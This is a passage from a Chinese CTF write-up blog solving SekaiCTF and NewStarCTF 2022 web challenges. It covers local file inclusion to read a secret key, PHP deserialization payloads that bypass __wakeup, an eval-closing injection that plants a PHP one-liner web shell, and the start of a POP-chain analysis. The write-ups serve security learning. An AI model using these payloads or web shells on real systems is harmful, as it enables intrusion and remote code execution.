class="built_in">open</span>(requested_path) <span class="keyword">as</span> f:</span><br><span class="line">            tfile = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No This Poems&quot;</span></span><br><span class="line">    <span class="keyword">return</span> tfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/sign&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=sekai)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=sekai)</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;guest&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;admin&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pls no hax&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p>在</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> config.secret <span class="keyword">import</span> sekai</span><br></pre></td></tr></table></figure>

<p>看到<code>config.secret</code>，这是个文件路径<code>/config/secret</code></p>
<p>我们可以访问看看，能不能看到里面的内容【注意这个文件肯定是在 <code>/app</code>目录下】</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>app<span class="regexp">/config/</span>secret.py</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sekai</span> <span class="operator">=</span> <span class="string">&quot;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&quot;</span></span><br></pre></td></tr></table></figure>



<hr>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> lfi 读取文件和秘密</span><br><span class="line"><span class="bullet">2.</span> 使用 cookie pickle rce 反弹shell</span><br><span class="line"><span class="bullet">3.</span> 执行./flag获取flag</span><br></pre></td></tr></table></figure>

<p>根据官方的<code>pickle rce</code>，这个涉及新的 <code>pickle</code> 反序列化技巧</p>
<p>【流下没技术的眼泪】可我现在只会<code>php</code>反序列化，后面补上</p>
<hr>
<h2 id="2-sekai-game-start"><a href="#2-sekai-game-start" class="headerlink" title="2.sekai-game-start"></a>2.sekai-game-start</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start === True)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sekai Game Start Here is your flag &quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=False;    </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看起来是到<code>反序列化</code>的题目，看起来似乎难度不大，但是我被瓶子诗卡了太久，这几天又在搞<code>DC5</code>，后面的题目发布出来都没怎么看了，早知道做一下了<code>【哭唧唧】</code></p>
<p>我们先简单的分析一下源码内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./flag.php&#x27;</span>);    <span class="comment">//文件包含，把当前目录flag.php文件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;<span class="comment">//给strat变量赋值为True</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start === True)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sekai Game Start Here is your flag &quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">            <span class="comment">//getenv函数 用来获取php 环境变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=False;</span><br><span class="line"><span class="comment">//这里又把start变量赋值为False，所以这里是需要绕过__wakeup魔术方法，不让其执行，只用把属性个数改得大于原来就行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]);  <span class="comment">//这里就是序列化的变量，变量名为sekai_game.run</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后我们整理一下</p>
<p>得到我们的序列化的<code>php</code>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Sekai_Game</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行得到序列化结果</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>我们修改一下属性值</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><code>【苦笑】但实际是不行的</code></p>
<h3 id="关键考点"><a href="#关键考点" class="headerlink" title="关键考点"></a>关键考点</h3><p>但是</p>
<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003135130855.png"><img src="/2022SekaiCTF/image-20221003135130855.png" alt="image-20221003135130855"></a></p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">PhP 变量不能使用 . ，但是这个变量名很特殊：sekai_game.run. 它同时具有 <span class="literal">_</span> 和 . </span><br><span class="line"></span><br><span class="line">php默认将.所有参数名称转换为<span class="literal">_</span>，因为版本早于<span class="number">8</span>，有一种方法可以解决这个问题，使用[ ，php忽略所有 . ，只转换[为<span class="literal">_</span>参数 ==&gt; ?sekai[game.run=</span><br><span class="line"></span><br><span class="line">**学到了**</span><br></pre></td></tr></table></figure>

<p>所以有效的<code>payload</code>为</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">url/?sekai[game.<span class="attribute">run</span>=xxx</span><br></pre></td></tr></table></figure>



<p>第二步是绕过<code>__wakeup</code></p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">这里我用</span><br><span class="line">O:10:&quot;Sekai_Game&quot;:2:&#123;s:5:&quot;start&quot;;b:1;&#125;</span><br><span class="line"></span><br><span class="line">实际还是绕不过__wakeup函数，就算是属性个数大于原来的属性个数</span><br><span class="line"></span><br><span class="line"><span class="section">==&gt;网上找了以后，发现这个方法是有局限性的，对于高版本的php，这样是无法绕过__wakeup()</span></span><br><span class="line"><span class="section">----</span></span><br><span class="line"></span><br><span class="line">对于高版本的php</span><br><span class="line">可以用C:来绕过</span><br><span class="line"></span><br><span class="line">原理是C:代表这个类实现了serializeable接口，而serializeable不支持<span class="emphasis">__wakeup，就绕过去了</span></span><br><span class="line"><span class="emphasis">==&gt;</span></span><br><span class="line"><span class="emphasis">C:10:&quot;Sekai_</span>Game&quot;:2:&#123;s:5:&quot;start&quot;;b:1;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">但是因为源码中已经赋值，所以不填写数据，</span><br><span class="line">只用实例化Sekai_Game类</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Sekai_Game</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">==&gt;O:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br><span class="line">==&gt;C:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure>



<p>于是最后的payload为</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?sekai[game.<span class="built_in">run</span>=C:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure>



<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003162948932.png"><img src="/2022SekaiCTF/image-20221003162948932.png" alt="image-20221003162948932"></a></p>
<p><strong>得到flag</strong></p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>NewStarCTF2022公开赛-wp</title>
    <url>/2022NewStarCTF/</url>
    <content><![CDATA[<p><code>没啥简介</code></p>
<span id="more"></span>

<h1 id="NewStarCTF2022公开赛"><a href="#NewStarCTF2022公开赛" class="headerlink" title="NewStarCTF2022公开赛"></a>NewStarCTF2022公开赛</h1><p><code>虽然是别人学校的新生赛，难度不是很高，但是还是有许多值得学习的知识点</code></p>
<h2 id="1-NotPHP"><a href="#1-NotPHP" class="headerlink" title="1.NotPHP"></a>1.NotPHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]) == <span class="string">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) == <span class="number">2077</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hack Me&quot;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Number error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong Key!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Pass it!&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>这里绕过不细讲，都是常见的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>细讲这个</p>
<p>这个是一个<code>eval</code>函数，但是里面其实已经被<code>#</code>给注释掉了，</p>
<p>所以无论输入什么都没结果</p>
<hr>
<p>因此需要闭合或者绕过<code>#</code></p>
<p>但是我试了很多闭合方式，结果都没反应</p>
<p>最后发现</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>实现了语句闭合，</p>
<p>但是，当把这个php结尾符加到后面时候，这个php就就结束了</p>
<p>以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>为例子</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">url/xxx&amp;cmd=?&gt;haha</span><br></pre></td></tr></table></figure>

<p>当我们闭合了php代码后，那后面的<code>haha</code>的位置在哪里呢</p>
<p><a data-fancybox="gallery" data-src="/2022NewStarCTF/image-20220921083750913.png"><img src="/2022NewStarCTF/image-20220921083750913.png" alt="image-20220921083750913"></a></p>
<p>我们可以看到，<code>haha</code>变成了<code>html</code>代码</p>
<p>那么就可以操作了，</p>
<p>比如xss，一句话🐎的插入等</p>
<p>xss我试了，没有结果，现在的xss利用层面和危害也不高了（可能是我技术不到位）</p>
<hr>
<p>插入一句话🐎</p>
<p>开始因为是<code>html</code>，我是试了<code>jsp</code>一句话</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">&quot;cmd&quot;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>但是用蚁剑连不上</p>
<p>最后按照传统思路，我在后面插入<code>php</code>一句话</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>好家伙，传统思路，才是真</p>
<p>连接成功拿到<code>flag</code></p>
<hr>
<p>不知道有没有看到这篇文章的同学看到这个<code>wp</code>，提醒一下，这里需要在<code>http body</code>里补充<code>num</code>请求信息</p>
<p>因为这也是绕过的一个环节</p>
<p><a data-fancybox="gallery" data-src="/2022NewStarCTF/image-20220921084836402.png"><img src="/2022NewStarCTF/image-20220921084836402.png" alt="image-20220921084836402"></a></p>
<hr>
<h2 id="2-UnserializeOne"><a href="#2-UnserializeOne" class="headerlink" title="2.UnserializeOne"></a>2.UnserializeOne</h2><p>一道<code>popchain</code>，这还是我第一次做<code>popchain</code>类【惭愧，不过做着真有意思】</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造<code>pop</code>链主要在于，</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">把我们需要触发的魔术方法联系在一起，而且在联系触发过程中也要记得实例化目标类，这样才能调用和执行其中的方法</span><br></pre></td></tr></table></figure>



<p>我们先中每个类其中的魔术方法列出来看看，再分析一下</p>
<p><code>Start</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     //<span class="title">__destruct</span>(<span class="params"></span>)，对象被销毁时触发，也就是最后运行结束时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">      <span class="comment">//这里进行echo $this-&gt;name，如果$this-&gt;name是一个类就会调用Sec()类里__toString()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">   //<span class="title">__isset</span>(<span class="params"></span>)，当对不可访问属性调用<span class="title">isset</span>(<span class="params"></span>)或<span class="title">empty</span>(<span class="params"></span>)时调用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="comment">//这里把$this-&gt;func当作一个函数，执行$this-&gt;func()</span></span><br><span class="line">        <span class="comment">//如果$this-&gt;func不是一个正确的函数名，就会调用Sec类里__invoke()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Sec</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  //<span class="title">__toString</span>(<span class="params"></span>)，把类当做字符串时触发，</span></span><br><span class="line"><span class="function">  //所以在<span class="title">Start</span>类中的[<span class="title">echo</span> &quot;<span class="title">Welcome</span> <span class="title">to</span> <span class="title">NewStarCTF</span>, &quot;.$<span class="title">this</span>-&gt;<span class="title">name</span></span>;]，就需要把name值赋值为Sec类名</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">       <span class="comment">//这里想调用this-&gt;obj的check方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     //<span class="title">__invoke</span>(<span class="params"></span>)，当脚本尝试将对象调用为函数时触发</span></span><br><span class="line"><span class="function">   //所以在<span class="title">Start</span>类中的[$<span class="title">this</span>-&gt;<span class="title">func</span>)(<span class="params"></span>)</span>;]中，需要把func值赋值为Sec，从而把其当作函数执行时，从而触其魔术方法</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">      <span class="comment">//这里就是目标，执行文件包含flag输出内容</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Easy</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">   //<span class="title">__call</span>(<span class="params"></span>)，在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="function">   //所以在<span class="title">Sec</span>类中，当<span class="title">this</span>-&gt;<span class="title">obj</span>赋值为<span class="title">Easy</span>类时，调用<span class="title">check</span>方法时，就会触发，因为<span class="title">Easy</span>里没有<span class="title">check</span>函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//这里调用clone，当对象完成复制时会执行eeee里的__clone</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>eeee</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="comment">//这里是对$this-&gt;obj的cmd属性使用isset函数，但是并不存在cmd属性</span></span><br><span class="line">            <span class="comment">//所以把this-&gt;obj赋值为Strat类名，从而触发__isset</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>整理一下</p>
